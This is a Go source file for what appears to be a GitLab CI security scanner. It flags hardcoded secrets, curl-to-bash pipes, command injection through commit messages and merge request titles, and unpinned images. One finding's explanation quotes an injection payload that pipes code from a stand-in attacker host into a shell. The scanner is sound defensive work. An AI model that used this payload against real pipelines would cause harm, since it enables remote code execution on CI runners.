package scanner

import (
	"os"
	"strings"

	"gopkg.in/yaml.v3"
)

// GitlabJob represents a job in a .gitlab-ci.yml file
type GitlabJob struct {
	Image  string   `yaml:"image"`
	Script []string `yaml:"script"`
	Before []string `yaml:"before_script"`
	After  []string `yaml:"after_script"`
}

// ScanGitlabFile reads and parses a GitLab CI file
func ScanGitlabFile(filepath string) ([]Issue, error) {
	data, err := os.ReadFile(filepath)
	if err != nil {
		return nil, err
	}
	return ScanGitlabData(data)
}

// ScanGitlabData applies security rules to GitLab CI YAML
func ScanGitlabData(data []byte) ([]Issue, error) {
	// GitLab CI YAML structure is very dynamic. Jobs can be top-level keys.
	// We'll unmarshal into a generic map to handle this structure.
	var gitlabCI map[string]interface{}
	if err := yaml.Unmarshal(data, &gitlabCI); err != nil {
		return nil, err
	}

	var issues []Issue
	contentStr := string(data)

	// Rule: Hardcoded Secrets globally in file
	if awsKeyRegex.MatchString(contentStr) {
		issues = append(issues, Issue{
			Rule:     "Hardcoded AWS Key",
			Severity: "CRITICAL",
			Location: "Global (File content)",
			PoC:      extractMatch(awsKeyRegex, contentStr),
			Exploit:  "Attackers clone/scrape the public repository and extract the plaintext AWS credential to authenticate to the AWS API.",
			Impact:   "Anyone who can read this repo can compromise the associated AWS environment.",
			Fix:      "Move this to GitLab CI/CD Variables.",
		})
	}

	matches := genericSecretRegex.FindAllString(contentStr, -1)
	for _, match := range matches {
		lowerMatch := strings.ToLower(match)
		if strings.Contains(lowerMatch, "${{") || strings.Contains(lowerMatch, "$CI_") || strings.Contains(lowerMatch, "placeholder") || strings.Contains(lowerMatch, "example") || strings.Contains(lowerMatch, "replace") || strings.Contains(lowerMatch, "dummy") {
			continue
		}
		issues = append(issues, Issue{
			Rule:     "Potential Hardcoded Secret",
			Severity: "HIGH",
			Location: "Global (File content)",
			PoC:      truncateString(match, 30),
			Exploit:  "Attackers use automated tools to scan repos for keywords like 'password' or 'token' followed by high-entropy strings.",
			Impact:   "Hardcoding secrets leads to accidental leaks and potential credential theft.",
			Fix:      "Move this to GitLab CI/CD Variables.",
		})
		break
	}

	// Iterate through the generic map to find job definitions
	for key, value := range gitlabCI {
		// Ignore reserved GitLab keywords like stages, variables, include, etc.
		if key == "stages" || key == "variables" || key == "include" || key == "default" || key == "workflow" || key == "cache" {
			continue
		}

		// Try to parse the value as a job map
		jobMap, ok := value.(map[string]interface{})
		if !ok {
			continue
		}
		jobScope := "Job: " + key

		// Check for specific security issues in the job's scripts
		checkScripts := func(scriptInterface interface{}, scriptType string) {
			if scriptInterface == nil {
				return
			}

			// Scripts can be a single string or a list of strings in GitLab
			var scripts []string
			if sList, ok := scriptInterface.([]interface{}); ok {
				for _, s := range sList {
					if str, ok := s.(string); ok {
						scripts = append(scripts, str)
					} else {
						// Fallback: marshal the map/complex type back to string for regex scanning
						yamlBytes, err := yaml.Marshal(s)
						if err == nil {
							scripts = append(scripts, string(yamlBytes))
						}
					}
				}
			} else if sStr, ok := scriptInterface.(string); ok {
				scripts = append(scripts, sStr)
			}

			for _, scriptLine := range scripts {
				// Rule: Dangerous Curl to Bash
				if curlBashRegex.MatchString(scriptLine) {
					issues = append(issues, Issue{
						Rule:     "Remote Code Execution (Curl to Bash)",
						Severity: "HIGH",
						Location: jobScope + " > " + scriptType,
						PoC:      extractMatch(curlBashRegex, scriptLine),
						Exploit:  "If the remote server is compromised or MITM'd, the attacker modifies the script and it is immediately executed via the pipe.",
						Impact:   "Blind execution of untrusted malware on the runner.",
						Fix:      "Download the script, verify its SHA256 checksum, then execute it.",
					})
				}

				// Rule: Potential Command Injection via GitLab Predefined Variables
				// e.g., CI_COMMIT_MESSAGE, CI_MERGE_REQUEST_TITLE can be manipulated by users
				untrustedVars := []string{
					"$CI_COMMIT_MESSAGE",
					"${CI_COMMIT_MESSAGE}",
					"$CI_MERGE_REQUEST_TITLE",
					"${CI_MERGE_REQUEST_TITLE}",
				}
				for _, untrustedVar := range untrustedVars {
					if strings.Contains(scriptLine, untrustedVar) {
						// Simple heuristic: if it's evaluated inside the script line directly
						issues = append(issues, Issue{
							Rule:     "Command Injection Risk",
							Severity: "CRITICAL",
							Location: jobScope + " > " + scriptType,
							PoC:      truncateString(scriptLine, 40),
							Exploit:  "An attacker submits a malicious merge request title or commit message like `\"; curl attacker.com/malware | sh #`. The variable is interpolated and executed by the shell.",
							Impact:   "Remote Code Execution on the GitLab Runner.",
							Fix:      "Pass the variable safely to a script file rather than executing it inline.",
						})
						break
					}
				}
			}
		}

		// Check script, before_script, after_script blocks
		checkScripts(jobMap["script"], "script")
		checkScripts(jobMap["before_script"], "before_script")
		checkScripts(jobMap["after_script"], "after_script")

		// Rule: Unpinned Docker Image
		if image, ok := jobMap["image"].(string); ok {
			if image != "" && !strings.Contains(image, "@sha256:") {
				if strings.Contains(image, ":latest") || !strings.Contains(image, ":") {
					issues = append(issues, Issue{
						Rule:     "Unpinned Docker Image",
						Severity: "MEDIUM",
						Location: jobScope,
						PoC:      "image: " + image,
						Exploit:  "The underlying image tag (e.g. 'latest') changes unexpectedly or is compromised in the upstream registry. The runner pulls the compromised image automatically.",
						Impact:   "Supply chain attack leading to backdoored builds or stolen secrets.",
						Fix:      "Pin the image to a specific SHA256 hash (e.g., node@sha256:1234...).",
					})
				}
			}
		}
	}

	return issues, nil
}
